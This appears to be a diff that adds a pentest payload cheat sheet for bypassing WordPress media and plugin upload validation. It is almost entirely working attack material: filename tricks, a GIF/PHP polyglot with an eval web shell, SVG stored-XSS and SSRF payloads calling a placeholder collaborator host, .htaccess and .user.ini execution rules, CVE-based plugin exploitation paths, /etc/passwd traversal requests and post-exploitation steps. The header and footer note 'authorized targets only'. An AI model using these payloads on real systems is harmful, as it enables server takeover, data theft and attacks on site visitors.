@@ -1,0 +1,76 @@
+# WordPress File Upload Bypass payloads
+# Targets /wp-admin/media-new.php, plugins' upload endpoints, and profile avatars.
+# Authorized targets only.
+
+## 0. Context
+# WP validates media uploads via wp_check_filetype_and_ext(). It allows only
+# image/svg/pdf/doc/xls/zip etc. per wp_get_mime_types(). Bypass = trick that
+# validator into accepting your payload OR use a plugin's lax uploader.
+
+## 1. Filename trickery (the classic set)
+shell.php.png
+shell.png.php
+shell.php.jpg
+shell.phtml
+shell.php5
+shell.php%00.png            # null byte (patched in modern core; try anyway on plugins)
+shell.png.php%00.jpg
+shell.jpg.pHp5
+shell.php%0a.jpg
+../../shell.php            # path traversal in filename (some custom uploaders)
+shell.php/shell.png        # Apache treats last segment as name (mod_php per-dir)
+shell.pHp                  # case tricks against case-sensitive validator
+
+## 2. Polyglot (file is BOTH a valid image AND valid PHP)
+# GIF header + PHP at end:
+GIF89a
+<?php @eval($_POST['x']); ?>
+
+# PNG: prepend minimal PNG header then php code tail.
+# JPG: JPEG_EXIF comment + `<?php` at end (exiftool -Comment="...")
+# Include it via LFI to execute:
+?page=uploads/2026/01/shell.gif&x=system('id')
+
+## 3. SVG vector -> stored XSS / SSRF / LFI
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
+<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></svg>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <image xlink:href="http://YOUR-COLLABORATOR.com/x" width="1" height="1"/>
+</svg>
+# The LAST one fires an HTTP request from the viewer's browser (blind stored SSRF/XSS).
+
+## 4. .htaccess / .user.ini rule drop (only if upload lands in a writable parent)
+# Some misconfigured uploaders allow arbitrary names. Drop:
+#    .htaccess  ->  AddType application/x-httpd-php .png   (execute png as php)
+#    .user.ini  ->  auto_prepend_file = shell.png.png     (php-fpm + programmatic include)
+#    .htaccess  ->  <FilesMatch ".*\.ph.*"> SetHandler php5-script </FilesMatch>
+
+## 5. Plugin-specific lax uploaders (still running on legacy sites)
+# WP File Manager            /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
+#    (CVE-2020-25213, unauthenticated RCE via fake 'upload' - verify version first)
+# Simple File List           POST /wp-admin/admin-ajax.php action=sfml_uploader
+#     (ends with a path: $_FILES path + double ext bypass)
+# ThemeREX / REHub importer 'up_sell_theme' ending backdoors via zip import
+# Contact form plugins with attachment: craft filename + re-zip polyglot.
+# WPForms / Formidable: mimetype check on SVG often absent -> SVG XSS above.
+
+## 6. MIME header forge (to pass wp_check_filetype "content-type" sniff)
+# Send only Content-Type image/png + a real PNG magic bytes header,
+# then PHP tail. Validator reads header, Apache/fpm executes tail.
+
+## 7. Unauthenticated paths to try FIRST (no login needed)
+GET  /wp-content/uploads/2026/01/shell.php
+GET  /wp-content/uploads/2026/01/shell.php.png      # served? -> executes if misconfig
+POST /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php  (issue check)
+GET  /wp-content/plugins/simple-file-list/ee-downloader.php?fee=../../../../../../etc/passwd
+GET  /wp-content/plugins/duplicator/..%2f..%2f..%2fetc/passwd
+GET  /wp-content/uploads/.htaccess
+GET  /wp-content/uploads/wpforms/
+
+## 8. After you land a file
+# - Hit it directly: /wp-content/uploads/2026/01/shell.php?cmd=id
+# - If it won't execute as .php, include it via any LFI in plugins (TimThumb,
+#   Duplicator file manager, theme shortcodes) so php://filter wraps it.
+# - If uploads dir blocks php execution (WP hardening), change approach:
+#   stored XSS (SVG) or plugin RCE instead.
+# Every technique is for authorized testing only.
